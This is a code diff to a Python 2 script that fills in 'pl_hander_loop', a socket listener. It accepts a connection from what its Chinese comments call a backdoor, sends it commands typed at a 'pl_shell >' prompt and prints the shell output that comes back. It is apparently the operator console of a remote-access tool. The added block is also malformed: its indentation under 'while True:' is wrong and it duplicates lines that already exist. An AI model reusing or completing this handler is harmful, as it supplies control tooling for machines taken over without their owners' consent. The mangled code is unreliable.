@@ -128,8 +128,29 @@ def pl_hander_loop(lhost,lport):
     print "[+] Start Listening port %s..." %lport
     while True:
         #接收shell和发送客户端信息
-        pass
-
+    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server.bind((lhost, lport))
+    server.listen(1)
+    BUFSIZ = 2048
+    print "[+] Start Listening host %s..." %lhost
+    print "[+] Start Listening port %s..." %lport
+    while True:
+        #接收shell和发送客户端信息
+        client, addr = server.accept()
+        data = raw_input('pl_shell >')
+        try:
+            client.send(data.encode('utf-8'))
+            if data.upper()=="BACK":
+                break
+            #backdoor出错必须返回空，否则将死循环
+            os_result = client.recv(BUFSIZ)
+            if os_result == "":
+                client.close()
+                break
+        except:
+            client.close()
+            break
+        print (os_result)
 
 
 
